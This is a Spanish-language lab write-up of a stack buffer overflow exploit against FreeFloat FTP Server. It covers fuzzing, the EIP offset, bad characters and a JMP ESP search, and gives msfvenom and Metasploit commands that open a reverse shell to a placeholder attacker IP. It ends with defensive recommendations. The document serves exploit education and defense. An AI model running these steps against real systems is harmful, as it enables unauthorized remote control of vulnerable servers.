# 🧨 Explotación de vulnerabilidad - FreeFloat FTP Server

## 📌 Descripción

En esta sección se documenta el proceso completo de explotación de una vulnerabilidad de tipo **stack buffer overflow** en el servicio FreeFloat FTP Server, dentro de un entorno de laboratorio controlado.

El objetivo es demostrar cómo, a partir de un fallo en la gestión de memoria, es posible tomar el control del flujo de ejecución y conseguir una shell remota.

---

## 🧪 Entorno de laboratorio

- Máquina víctima: Windows (FreeFloat FTP Server)
- Máquina atacante: Kali Linux
- Herramientas utilizadas:
  - IDA Free
  - Immunity Debugger
  - Mona.py
  - Python
  - msfvenom
  - Metasploit

---

## 🔍 1. Análisis estático con IDA

Se abrió el binario del servidor FTP en IDA Free para realizar un análisis inicial del código.

Para facilitar la lectura:
- View → Open Subviews → Generate Pseudocode
- Click derecho → Synchronize with → Pseudocode-A

Se buscaron cadenas relevantes como "USER" para localizar funciones críticas.

---

## ⚙️ 2. Ejecución y depuración del servicio

Se ejecutó el servidor FTP y se adjuntó Immunity Debugger al proceso:

File → Attach → seleccionar proceso → Enter

Se reanudó la ejecución con el botón Play.

Se verificó el servicio con:

ncat localhost 21

---

## 💥 3. Fuzzing

Se enviaron cadenas crecientes hasta provocar un crash.

Se observó en Immunity:
EIP = 41414141

Esto confirma el desbordamiento.

---

## ⚙️ 4. Configuración de Mona

!mona config -set workingfolder c:\mona

---

## 🎯 5. Control del EIP

!mona pattern_create 400

Se envió el patrón y se obtuvo el valor de EIP.

!mona pattern_offset 41326941

Resultado: 246

Validación:
EIP = 42424242

---

## 🚫 6. Bad Chars

!mona bytearray

Se comparó memoria:

!mona compare -f c:\mona\bytearray.bin -a ESP

Badchars detectados:
\x00 \x0A \x0D

---

## 🔁 7. JMP ESP

!mona asm -s "jmp esp"
Resultado: \xff\xe4

!mona find -s "\xff\xe4" -cpb "\x00\x0A\x0D"

Se seleccionó una dirección válida.

---

## 🧪 8. Validación

Se verificó que el flujo llegaba a la pila correctamente.

---

## 💣 9. Shellcode

msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=443 -f python -b "\x00\x0a\x0d"

---

## 🎯 10. Explotación final

Metasploit:

use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST TU_IP
set LPORT 443
exploit

Se obtuvo shell remota.

---

## ✅ Conclusión

Se ha conseguido:

- Control del EIP
- Redirección del flujo
- Ejecución remota de comandos

Laboratorio realizado en entorno controlado con fines educativos.


### 🛡️ Conclusiones y Defensa
Explotar el CVE-2025-5548 en un laboratorio nos enseña por qué las vulnerabilidades de corrupción de memoria son tan críticas.

Para que un equipo de Blue Team pueda defenderse de ataques similares, se recomiendan las siguientes medidas:

Compilación Segura: El software debe compilarse activando protecciones modernas del sistema operativo como ASLR (que aleatoriza las direcciones de memoria), DEP (que impide ejecutar código en la pila) y SafeSEH.

Validación de Entradas: Sustituir funciones inseguras en C/C++ (como strcpy) por alternativas que limiten el tamaño del búfer (como strncpy).

Gestión del Software Legado: Priorizar el parcheo, aislamiento en red o sustitución directa de servicios antiguos (como FreeFloat FTP) que ya no reciben soporte de seguridad.
